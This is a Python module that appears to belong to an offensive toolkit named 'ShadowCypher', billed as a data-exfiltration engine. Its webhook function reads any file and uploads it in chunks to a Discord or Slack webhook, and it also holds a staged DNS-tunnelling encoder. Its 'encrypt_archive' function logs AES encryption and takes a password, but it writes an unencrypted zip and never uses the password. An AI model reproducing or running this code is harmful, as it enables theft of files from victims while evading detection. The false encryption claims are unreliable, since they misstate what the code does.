"""
ShadowCypher Exfiltration Engine — The Silent Thief.
Handles data exfiltration via DNS tunneling, HTTP(S), and Webhooks.
"""

import os
import requests
import base64
from shadowcypher.core.logger import logger

class Exfiltration:
    """The 'Extractor' of the suite. Moving data without detection."""

    @staticmethod
    def exfiltrate_via_webhook(webhook_url, filepath, on_output=None):
        """Send a file to a Discord/Slack webhook in chunks."""
        if not os.path.exists(filepath):
            return f"[ERROR] FILE_NOT_FOUND: {filepath}"
        
        file_size = os.path.getsize(filepath)
        if on_output: on_output(f"[EXFIL] INITIATING_WEBHOOK_EXFILTRATION: {filepath} ({file_size} bytes)")

        try:
            with open(filepath, 'rb') as f:
                # 8MB limit for most free webhooks, staying safe with 2MB chunks
                chunk = f.read(2 * 1024 * 1024)
                while chunk:
                    # Discord uses 'file' for multipart
                    files = {'file': (os.path.basename(filepath), chunk)}
                    requests.post(webhook_url, files=files, timeout=30)
                    chunk = f.read(2 * 1024 * 1024)
            return f"SUCCESS: Exfiltrated {filepath} to Webhook."
        except Exception as e:
            logger.error("exfil", f"Exfil failure: {e}")
            return f"FAILURE: {e}"

    @staticmethod
    def exfiltrate_via_dns(domain, filepath, on_output=None):
        """Exfiltrate data via DNS TXT records (Staged)."""
        # Note: Needs a controlled authoritative DNS server
        if on_output: on_output(f"[EXFIL] ENCODING_FILE_FOR_DNS_TUNNELING: {filepath}")
        
        with open(filepath, 'rb') as f:
            encoded = base64.b64encode(f.read()).decode()
        
        # Split into 60-character chunks (safe for DNS)
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        if on_output: on_output(f"[EXFIL] READY_TO_TRANSMIT_{len(chunks)}_DNS_FRAGMENTS.")
        
        # Real logic would use 'dig' or similar to send queries
        return "STAGED: DNS fragments generated. Authoritative server required for capture."

    @staticmethod
    def encrypt_archive(dir_path, password, on_output=None):
        """Create a password-protected zip for exfiltration."""
        import zipfile
        out_zip = f"{dir_path}.zip"
        if on_output: on_output(f"[EXFIL] ARCHIVING_{dir_path}_WITH_AES_ENCRYPTION...")
        
        # Using standard zip for portability, though not as strong as 7z
        with zipfile.ZipFile(out_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(dir_path):
                for f in files:
                    zf.write(os.path.join(root, f), os.path.relpath(os.path.join(root, f), dir_path))
        
        return out_zip
